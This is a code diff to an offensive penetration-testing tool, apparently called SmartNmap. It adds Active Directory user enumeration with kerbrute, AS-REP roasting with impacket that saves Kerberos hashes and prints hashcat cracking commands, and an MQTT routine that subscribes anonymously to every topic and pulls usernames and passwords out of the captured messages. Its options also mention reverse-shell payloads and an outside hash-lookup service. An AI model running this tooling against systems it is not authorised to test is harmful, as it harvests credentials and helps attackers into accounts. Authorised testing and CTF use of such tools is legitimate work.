@@ -2735,6 +2735,12 @@ _CRAWL_WORDLISTS = [
     '/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt',
     '/usr/share/seclists/Discovery/Web-Content/common.txt',
 ]
+# Username lists for AD user-enumeration (kerbrute) — bigger than the brute shortlist
+_AD_USERLISTS = [
+    '/usr/share/seclists/Usernames/Names/names.txt',
+    '/usr/share/wordlists/seclists/Usernames/Names/names.txt',
+    '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
+]
 
 
 # ── Web crawl → URL / parameter corpus ────────────────────────────────────
@@ -3174,15 +3180,24 @@ def run_ad_enum_unauth(target, services, outdir, args, tools, loot=None, domain=
     if has_kerberos and domain and shutil.which('kerbrute'):
         users_file = outdir / 'ad_users.txt'
         ulist = str(users_file) if users_file.exists() else (
-                getattr(args, 'userlist', None) or _first_path(_DEFAULT_USERLISTS))
+                getattr(args, 'userlist', None) or _first_path(_AD_USERLISTS)
+                or _first_path(_DEFAULT_USERLISTS))
         if ulist and active_enabled(args):
-            info(f"kerbrute userenum ({domain})")
-            _, out, _ = _run(['kerbrute', 'userenum', '-d', domain, '--dc', target, ulist], timeout=300)
-            (outdir / 'kerbrute.txt').write_text(out)
-            for m in re.finditer(r'VALID USERNAME:\s*(\S+)', out):
-                good(f"  valid user: {m.group(1)}")
-                if loot:
-                    loot.add('usernames', m.group(1).split('@')[0])
+            info(f"kerbrute userenum ({domain}, wl={Path(ulist).name})")
+            _, out, _ = _run(['kerbrute', 'userenum', '-d', domain, '--dc', target,
+                             '-o', str(outdir / 'kerbrute.txt'), ulist], timeout=600)
+            kb = (outdir / 'kerbrute.txt').read_text() if (outdir / 'kerbrute.txt').exists() else ''
+            valid = sorted(set(re.findall(r'VALID USERNAME:\s*([^@\s]+)', out + kb)))
+            if valid:
+                # persist so AS-REP roast / spray / reuse consume them
+                existing = users_file.read_text().splitlines() if users_file.exists() else []
+                users_file.write_text('\n'.join(sorted(set(existing + valid))))
+                context['users'] = sorted(set((context.get('users') or []) + valid))
+                for u in valid:
+                    good(f"  valid user: {u}")
+                    if loot:
+                        loot.add('usernames', u)
+                        loot.add_step(f"AD: valid user {u} (kerbrute) -> AS-REP roast / spray")
         elif ulist:
             _recommend(loot, f"kerbrute userenum -d {domain} --dc {target} {ulist}",
                        "validate AD usernames")
@@ -4091,6 +4106,65 @@ def emit_sqli_cheatsheet(vulns, corpus_params, loot):
         loot.add('recommend', f"[sqli] {c}")
 
 
+def run_mqtt_suite(target, services, outdir, args, tools, loot=None):
+    """MQTT (1883/8883) enumeration: anonymously subscribe to '#' and harvest
+    retained messages — a classic IoT/broker foothold where creds leak in the
+    message stream. Uses mosquitto_sub if present, else the built-in nmap
+    mqtt-subscribe NSE. Harvested creds feed the credential state machine."""
+    vulns = []
+    mqtt_ports = [p for p, s in services.items()
+                  if 'mqtt' in s.get('service', '').lower() or p in (1883, 8883)]
+    if not mqtt_ports:
+        return vulns
+    subsection("MQTT Enumeration")
+    for port in mqtt_ports:
+        msgs = ''
+        if shutil.which('mosquitto_sub') and shutil.which('timeout'):
+            listen = getattr(args, 'mqtt_listen', None) or ('20' if _low_intensity(args) else '45')
+            info(f"mosquitto_sub -t '#' on {target}:{port} (listening {listen}s for live messages)")
+            # 'timeout' bounds the persistent subscriber so captured output is preserved
+            _, msgs, _ = _run(['timeout', listen, 'mosquitto_sub', '-h', target, '-p', str(port),
+                              '-t', '#', '-t', '$SYS/#', '-v'], timeout=int(listen) + 15)
+        else:
+            info(f"nmap mqtt-subscribe NSE on {target}:{port}")
+            txt = outdir / f'mqtt_{port}.txt'
+            _run(['nmap', '-p', str(port), '--script', 'mqtt-subscribe',
+                 '--script-args', 'mqtt-subscribe.timeout=20s,mqtt-subscribe.listen-msgs=400',
+                 '-oN', str(txt), '-Pn', '-n', target], timeout=90)
+            msgs = txt.read_text() if txt.exists() else ''
+        (outdir / f'mqtt_{port}_messages.txt').write_text(msgs)
+        # meaningful content = messages beyond nmap boilerplate
+        content = '\n'.join(l for l in msgs.splitlines()
+                            if l.strip() and not re.match(r'\s*(Starting Nmap|Nmap done|Host is|PORT|'
+                                                          r'\d+/tcp|Service Info|Service detection|'
+                                                          r'Nmap scan report)', l))
+        if content.strip():
+            good(f"MQTT anonymous subscribe OK on {port} — messages captured")
+            for line in content.splitlines()[:40]:
+                print(f"    {line.strip()[:200]}")
+            if loot:
+                loot.add('notes', f"MQTT broker {port}: anonymous subscribe allowed")
+                loot.scan_output(content)
+                loot.add_step(f"Foothold: MQTT anon subscribe on {port} -> harvest messages")
+                # explicit user/pass harvesting from message payloads
+                for m in re.finditer(r'(?i)(user(?:name)?|login)["\':=\s]+([^\s"\',:}]{2,})[^\n]*?'
+                                     r'(?:pass(?:word)?|pwd)["\':=\s]+([^\s"\',}]{2,})', content):
+                    loot.add_cred(m.group(2), m.group(3), source=f'mqtt:{port}', scope='unknown', verified=False)
+                    good(f"  MQTT candidate cred: {m.group(2)}:{m.group(3)}")
+                for m in re.finditer(r'\b([A-Za-z0-9._-]{3,})\s*[:/]\s*([^\s"\']{4,})\b', content):
+                    if m.group(1).lower() not in ('http', 'https', 'topic'):
+                        loot.add('creds', f"MQTT payload: {m.group(1)}:{m.group(2)}")
+            vulns.append({'port': port, 'service': 'mqtt', 'product': 'MQTT broker', 'version': '',
+                         'desc': 'MQTT broker allows anonymous subscription (secrets may leak in messages)',
+                         'cve': '', 'exploit': f"mosquitto_sub -h {target} -p {port} -t '#' -v",
+                         'severity': 'high'})
+        else:
+            info("  no retained messages captured on first pass")
+            _recommend(loot, f"mosquitto_sub -h {target} -p {port} -t '#' -v   # listen longer / publish-probe",
+                       "MQTT anonymous subscribe (install mosquitto-clients for live streams)")
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -4116,11 +4190,18 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
                 (outdir / f'searchsploit_{xml_file.stem}.txt').write_text(sploit_out)
 
     # Determine HTTP ports and build URL list
+    # MQTT enumeration (1883/8883): anonymous subscribe often leaks creds in messages
+    shellshock_vulns += run_mqtt_suite(target, services, outdir, args, tools, loot)
+
     http_ports = sorted([p for p, s in services.items()
                          if (any(x in s.get('service', '').lower() for x in ['http', 'www'])
                              or p in [80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 3128, 5000,
                                       5001, 7001, 7070, 8000, 8008, 8080, 8081, 8088, 8090, 8099,
                                       8443, 8834, 8888, 9000, 9001, 9080, 9443, 10443])
+                         # exclude RPC-over-HTTP / epmap / WinRM which aren't real web apps
+                         and not any(x in s.get('service', '').lower()
+                                     for x in ['rpc', 'epmap', 'wsman', 'winrm'])
+                         and p not in [593, 5985, 5986, 9389, 47001]
                          and 'httpapi' not in s.get('product', '').lower()])
 
     for port in http_ports:
@@ -4563,49 +4644,68 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
 
     # Kerberos AS-REP roast check (find users without pre-auth required)
     if 88 in services or any(s.get('service') == 'kerberos-sec' for s in services.values()):
-        subsection("Kerberos AS-REP Roast Check")
-        # Build candidate user list
+        subsection("Kerberos User Enumeration + AS-REP Roast Check")
+        # Derive the domain even when phase 3 LDAP NSE was skipped (--skip-nse)
+        if not domain_name:
+            domain_name = (getattr(args, 'domain', None)
+                           or next((h.split('.', 1)[1] for h in (hostnames or [])
+                                    if '.' in h and not h.replace('.', '').isdigit()), '')
+                           or '')
+        # Candidate users: any LDAP-derived users + a real username wordlist
+        # (GetNPUsers both enumerates existence via KDC errors AND AS-REP-roasts).
         candidate_users = list(ldap_users) if ldap_users else []
-        # Add common HTB/AD usernames
-        common_ad_users = [
-            'administrator', 'admin', 'guest', 'krbtgt', 'service', 'svc',
-            'fsmith', 'hsmith', 'bsmith', 'jdoe', 'jsmith', 'test',
-            'user', 'webadmin', 'sysadmin', 'backup',
-        ]
-        for u in common_ad_users:
-            if u not in candidate_users:
-                candidate_users.append(u)
+        wl = getattr(args, 'userlist', None) or _first_path(_AD_USERLISTS)
+        users_file = outdir / 'ad_candidates.txt'
+        if candidate_users:
+            users_file.write_text('\n'.join(dict.fromkeys(
+                candidate_users + ['administrator', 'guest', 'krbtgt'])))
+        elif wl and Path(wl).exists():
+            users_file.write_text(Path(wl).read_text())
+            info(f"user-enum wordlist: {Path(wl).name} ({sum(1 for _ in open(wl))} names)")
+        else:
+            users_file.write_text('administrator\nguest\nkrbtgt\nsvc\nadmin\n')
 
-        if domain_name and candidate_users:
-            users_file = outdir / 'ad_candidates.txt'
-            users_file.write_text('\n'.join(candidate_users[:60]))
-            # Prefer impacket GetNPUsers.py, fallback to Nmap krb5-enum-users
+        if domain_name and users_file.exists():
             imp_paths = ['GetNPUsers.py', 'impacket-GetNPUsers']
             imp_bin = next((b for b in imp_paths if shutil.which(b)), None)
             if imp_bin:
-                info(f"GetNPUsers.py (impacket) - domain {domain_name}")
+                info(f"GetNPUsers.py (impacket) user-enum + AS-REP - domain {domain_name}")
                 try:
                     r = subprocess.run(
                         [imp_bin, f'{domain_name}/', '-no-pass', '-usersfile', str(users_file),
                          '-dc-ip', target, '-format', 'hashcat'],
-                        capture_output=True, text=True, timeout=90)
+                        capture_output=True, text=True, timeout=900)
                     out = (r.stdout or '') + (r.stderr or '')
                     (outdir / 'asrep_roast.txt').write_text(out)
+                    # Valid users: AS-REP-roastable (hash) OR "doesn't have UF_DONT_REQUIRE_PREAUTH"
+                    valid = set(re.findall(r"User (\S+) doesn't have UF_DONT_REQUIRE_PREAUTH", out))
                     hashes = re.findall(r'\$krb5asrep\$\S+', out)
+                    for h in hashes:
+                        valid.add(h.split('@')[0].split('$')[-1])
+                    if valid:
+                        good(f"Valid AD users discovered: {', '.join(sorted(valid))}")
+                        adf = outdir / 'ad_users.txt'
+                        existing = adf.read_text().splitlines() if adf.exists() else []
+                        adf.write_text('\n'.join(sorted(set(existing) | valid)))
+                        if loot:
+                            for u in sorted(valid):
+                                loot.add('usernames', u)
+                            loot.add_step(f"AD: enumerated {len(valid)} valid users via Kerberos")
                     if hashes:
                         good(f"AS-REP roastable account(s) found!")
                         for h in hashes:
                             user_part = h.split('@')[0].split('$')[-1]
                             print(f"    {C.R}[AS-REP]{C.Re} {user_part}: {h[:80]}...")
+                            (outdir / 'asrep.hash').write_text('\n'.join(hashes))
                             if loot:
-                                loot.add('creds', f"AS-REP hash for {user_part} (domain: {domain_name})")
-                                loot.add('notes', f"Crack with: hashcat -m 18200 hash.txt rockyou.txt")
+                                loot.add('keys', f"AS-REP hash {user_part}: {h}")
+                                loot.add_step(f"AS-REP roast {user_part} -> hashcat -m 18200")
                             shellshock_vulns.append({
                                 'port': 88, 'service': 'kerberos',
                                 'product': 'Active Directory', 'version': '',
                                 'desc': f'AS-REP roastable account: {user_part} (no pre-auth required)',
                                 'cve': '', 'severity': 'high',
-                                'exploit': f'Crack with: hashcat -m 18200 /tmp/hash.txt /usr/share/wordlists/rockyou.txt',
+                                'exploit': f'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt',
                             })
                 except Exception as e:
                     warn(f"GetNPUsers failed: {e}")
@@ -5496,6 +5596,7 @@ Setup:
                          help='Look up captured hashes on crackcrypt.com (external egress; also on with --active)')
     offense.add_argument('--lhost', help='Attacker IP for generated reverse-shell payloads')
     offense.add_argument('--lport', help='Attacker port for reverse-shell payloads (default 4444)')
+    offense.add_argument('--mqtt-listen', help='Seconds to subscribe to MQTT topics (default 45)')
 
     output = p.add_argument_group('Output')
     output.add_argument('-o', '--output', help='Output directory')
@@ -5514,6 +5615,8 @@ Setup:
     mgmt.add_argument('--no-gobuster', action='store_true', help='Skip gobuster/ffuf dir brute')
     mgmt.add_argument('--resume', action='store_true',
                       help='Resume previous scan (reuses existing XML files in --output dir)')
+    mgmt.add_argument('--skip-nse', action='store_true',
+                      help='Skip phase 3 targeted NSE (fast path to phase 5 tools; good with --resume)')
     mgmt.add_argument('--version', action='version', version=f'SmartNmap {VERSION}')
 
     args = p.parse_args()
@@ -5856,7 +5959,11 @@ def _run_single_target(target, args, api_key, puter_token):
                 loot.add('notes', f"Searchsploit: {len(results)} exploit(s) for '{query}'")
 
     # ── Phase 3: Targeted Scripts ──
-    phase3_results = phase3_scripts(target, services, outdir, args, api_key, loot)
+    if getattr(args, 'skip_nse', False):
+        good("[skip-nse] Skipping phase 3 targeted NSE scans")
+        phase3_results = {}
+    else:
+        phase3_results = phase3_scripts(target, services, outdir, args, api_key, loot)
     for port, svc_data in phase3_results.items():
         if port in services and svc_data.get('scripts'):
             services[port].setdefault('scripts', {}).update(svc_data.get('scripts', {}))
